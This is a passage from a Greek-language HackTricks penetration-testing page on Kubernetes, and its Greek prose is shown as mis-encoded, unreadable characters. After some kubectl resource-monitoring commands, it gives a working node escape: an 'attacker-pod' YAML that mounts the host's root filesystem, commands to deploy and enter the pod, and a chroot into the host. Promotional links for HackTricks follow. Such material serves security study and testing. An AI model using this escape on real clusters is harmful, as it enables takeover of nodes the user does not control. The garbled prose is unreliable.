kubectl top pods -n <namespace> --sort-by=cpu

# Î›Î®ÏˆÎ· ÎºÎ±Ï„Î±Î½Î¬Î»Ï‰ÏƒÎ·Ï‚ Î¼Î½Î®Î¼Î·Ï‚ Î³Î¹Î± Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ Namespace
kubectl top pods -n <namespace> --sort-by=memory
```

ÎœÎµ Î±Ï…Ï„Î­Ï‚ Ï„Î¹Ï‚ ÎµÎ½Ï„Î¿Î»Î­Ï‚, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï€Î±ÏÎ±ÎºÎ¿Î»Î¿Ï…Î¸ÎµÎ¯Ï„Îµ Ï„Î¹Ï‚ ÎºÎ±Ï„Î±Î½Î±Î»ÏÏƒÎµÎ¹Ï‚ Ï„Ï‰Î½ Pods ÏƒÏ„Î¿ Ï€ÎµÏÎ¹Î²Î¬Î»Î»Î¿Î½ Kubernetes.
```
k top pod --all-namespaces
```
{% endtab %}
{% endtabs %}

### Î‘Ï€ÏŒÎ´ÏÎ±ÏƒÎ· Î±Ï€ÏŒ Ï„Î¿ pod

Î•Î¬Î½ Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î½Î­Î± pods, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î´ÏÎ±Ï€ÎµÏ„ÎµÏÏƒÎµÏ„Îµ Î±Ï€ÏŒ Î±Ï…Ï„Î¬ Ï€ÏÎ¿Ï‚ Ï„Î¿Î½ ÎºÏŒÎ¼Î²Î¿. Î“Î¹Î± Î½Î± Ï„Î¿ ÎºÎ¬Î½ÎµÏ„Îµ Î±Ï…Ï„ÏŒ, Ï€ÏÎ­Ï€ÎµÎ¹ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± Î½Î­Î¿ pod Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹ÏÎ½Ï„Î±Ï‚ Î­Î½Î± Î±ÏÏ‡ÎµÎ¯Î¿ yaml, Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ pod ÎºÎ±Î¹ ÏƒÏ„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î½Î± ÎµÎºÏ„ÎµÎ»Î­ÏƒÎµÏ„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® chroot ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï…. ÎœÏ€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï…Ï€Î¬ÏÏ‡Î¿Î½Ï„Î± pods Ï‰Ï‚ Î±Î½Î±Ï†Î¿ÏÎ¬ Î³Î¹Î± Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ yaml, ÎºÎ±Î¸ÏÏ‚ ÎµÎ¼Ï†Î±Î½Î¯Î¶Î¿Ï…Î½ Ï…Ï€Î¬ÏÏ‡Î¿Ï…ÏƒÎµÏ‚ ÎµÎ¹ÎºÏŒÎ½ÎµÏ‚ ÎºÎ±Î¹ Î´Î¹Î±Î´ÏÎ¿Î¼Î­Ï‚.
```bash
kubectl get pod <name> [-n <namespace>] -o yaml
```
> Î±Î½ Ï‡ÏÎµÎ¹Î¬Î¶ÎµÏƒÏ„Îµ Î½Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÎµÏ„Îµ Î­Î½Î± pod ÏƒÎµ Î­Î½Î± ÏƒÏ…Î³ÎºÎµÎºÏÎ¹Î¼Î­Î½Î¿ ÎºÏŒÎ¼Î²Î¿, Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Ï‡ÏÎ·ÏƒÎ¹Î¼Î¿Ï€Î¿Î¹Î®ÏƒÎµÏ„Îµ Ï„Î·Î½ Ï€Î±ÏÎ±ÎºÎ¬Ï„Ï‰ ÎµÎ½Ï„Î¿Î»Î® Î³Î¹Î± Î½Î± Î»Î¬Î²ÎµÏ„Îµ Ï„Î¹Ï‚ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï…
>
> `k get nodes --show-labels`
>
> Î£Ï…Î½Î®Î¸Ï‰Ï‚, Î¿Î¹ ÎµÏ„Î¹ÎºÎ­Ï„ÎµÏ‚ kubernetes.io/hostname ÎºÎ±Î¹ node-role.kubernetes.io/master ÎµÎ¯Î½Î±Î¹ ÎºÎ±Î»Î­Ï‚ ÎµÏ€Î¹Î»Î¿Î³Î­Ï‚ Î³Î¹Î± ÎµÏ€Î¹Î»Î¿Î³Î®.
>
> [Î±Î½Î±Ï†Î¿ÏÎ¬]: https://kubernetes.io/docs/concepts/scheduling-eviction/assign-pod-node/

Î£Ï„Î· ÏƒÏ…Î½Î­Ï‡ÎµÎ¹Î± Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î®ÏƒÏ„Îµ Ï„Î¿ Î±ÏÏ‡ÎµÎ¯Î¿ attack.yaml ÏƒÎ±Ï‚
```yaml
apiVersion: v1
kind: Pod
metadata:
labels:
run: attacker-pod
name: attacker-pod
namespace: default
spec:
volumes:
- name: host-fs
hostPath:
path: /
containers:
- image: ubuntu
imagePullPolicy: Always
name: attacker-pod
command: ["/bin/sh", "-c", "sleep infinity"]
volumeMounts:
- name: host-fs
mountPath: /root
restartPolicy: Never
# nodeName and nodeSelector enable one of them when you need to create pod on the specific node
#nodeName: master
#nodeSelector:
#  kubernetes.io/hostname: master
# or using
#  node-role.kubernetes.io/master: ""
```
[Î±ÏÏ‡Î¹ÎºÎ® Ï€Î·Î³Î® yaml](https://gist.github.com/abhisek/1909452a8ab9b8383a2e94f95ab0ccba)

ÎœÎµÏ„Î¬ Î±Ï€ÏŒ Î±Ï…Ï„ÏŒ, Î´Î·Î¼Î¹Î¿Ï…ÏÎ³ÎµÎ¯Ï„Îµ Ï„Î¿ pod
```bash
kubectl apply -f attacker.yaml [-n <namespace>]
```
Î¤ÏÏÎ± Î¼Ï€Î¿ÏÎµÎ¯Ï„Îµ Î½Î± Î¼ÎµÏ„Î±Î²ÎµÎ¯Ï„Îµ ÏƒÏ„Î¿ Î´Î·Î¼Î¹Î¿Ï…ÏÎ³Î·Î¼Î­Î½Î¿ pod Ï‰Ï‚ ÎµÎ¾Î®Ï‚
```bash
kubectl exec -it attacker-pod [-n <namespace>] -- sh # attacker-pod is the name defined in the yaml file
```
ÎšÎ±Î¹ Ï„ÎµÎ»Î¹ÎºÎ¬ ÎµÎºÏ„ÎµÎ»ÎµÎ¯Ï„Îµ Ï„Î·Î½ ÎµÎ½Ï„Î¿Î»Î® chroot ÏƒÏ„Î¿ ÏƒÏÏƒÏ„Î·Î¼Î± Ï„Î¿Ï… ÎºÏŒÎ¼Î²Î¿Ï…
```bash
chroot /root /bin/bash
```
Î Î»Î·ÏÎ¿Ï†Î¿ÏÎ¯ÎµÏ‚ Ï€Î¿Ï… Î±Ï€Î¿ÎºÏ„Î®Î¸Î·ÎºÎ±Î½ Î±Ï€ÏŒ: [Kubernetes Namespace Breakout using Insecure Host Path Volume â€” Part 1](https://blog.appsecco.com/kubernetes-namespace-breakout-using-insecure-host-path-volume-part-1-b382f2a6e216) [Attacking and Defending Kubernetes: Bust-A-Kube â€“ Episode 1](https://www.inguardians.com/attacking-and-defending-kubernetes-bust-a-kube-episode-1/)

## Î‘Î½Î±Ï†Î¿ÏÎ­Ï‚

{% embed url="https://www.cyberark.com/resources/threat-research-blog/kubernetes-pentest-methodology-part-3" %}

<details>

<summary><strong>ÎœÎ¬Î¸ÎµÏ„Îµ Ï„Î¿ hacking Ï„Î¿Ï… AWS Î±Ï€ÏŒ Ï„Î¿ Î¼Î·Î´Î­Î½ Î¼Î­Ï‡ÏÎ¹ Ï„Î¿Î½ Î®ÏÏ‰Î± Î¼Îµ Ï„Î¿</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Î†Î»Î»Î¿Î¹ Ï„ÏÏŒÏ€Î¿Î¹ Î³Î¹Î± Î½Î± Ï…Ï€Î¿ÏƒÏ„Î·ÏÎ¯Î¾ÎµÏ„Îµ Ï„Î¿ HackTricks:

* Î•Î¬Î½ Î¸Î­Î»ÎµÏ„Îµ Î½Î± Î´ÎµÎ¯Ï„Îµ Ï„Î·Î½ **ÎµÏ„Î±Î¹ÏÎµÎ¯Î± ÏƒÎ±Ï‚ Î½Î± Î´Î¹Î±Ï†Î·Î¼Î¯Î¶ÎµÏ„Î±Î¹ ÏƒÏ„Î¿ HackTricks** Î® Î½Î± **ÎºÎ±Ï„ÎµÎ²Î¬ÏƒÎµÏ„Îµ Ï„Î¿ HackTricks ÏƒÎµ Î¼Î¿ÏÏ†Î® PDF**, ÎµÎ»Î­Î³Î¾Ï„Îµ Ï„Î± [**Î£Î§Î•Î”Î™Î‘ Î£Î¥ÎÎ”Î¡ÎŸÎœÎ—Î£**](https://github.com/sponsors/carlospolop)!
* Î‘Ï€Î¿ÎºÏ„Î®ÏƒÏ„Îµ Ï„Î¿ [**ÎµÏ€Î¯ÏƒÎ·Î¼Î¿ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Î‘Î½Î±ÎºÎ±Î»ÏÏˆÏ„Îµ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), Ï„Î· ÏƒÏ…Î»Î»Î¿Î³Î® Î¼Î±Ï‚ Î±Ï€ÏŒ Î±Ï€Î¿ÎºÎ»ÎµÎ¹ÏƒÏ„Î¹ÎºÎ¬ [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Î•Î³Î³ÏÎ±Ï†ÎµÎ¯Ï„Îµ ÏƒÏ„Î·** ğŸ’¬ [**Î¿Î¼Î¬Î´Î± Discord**](https://discord.gg/hRep4RUj7f) Î® ÏƒÏ„Î· [**Î¿Î¼Î¬Î´Î± telegram**](https://t.me/peass) Î® **Î±ÎºÎ¿Î»Î¿Ï…Î¸Î®ÏƒÏ„Îµ** Î¼Îµ ÏƒÏ„Î¿ **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **ÎœÎ¿Î¹ÏÎ±ÏƒÏ„ÎµÎ¯Ï„Îµ Ï„Î± ÎºÏŒÎ»Ï€Î± ÏƒÎ±Ï‚ Î³Î¹Î± Ï„Î¿ hacking Ï…Ï€Î¿Î²Î¬Î»Î»Î¿Î½Ï„Î±Ï‚ PRs ÏƒÏ„Î±** [**HackTricks**](https://github.com/carlospolop/hacktricks) ÎºÎ±Î¹ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Î±Ï€Î¿Î¸ÎµÏ„Î®ÏÎ¹Î± Ï„Î¿Ï… github.

</details>
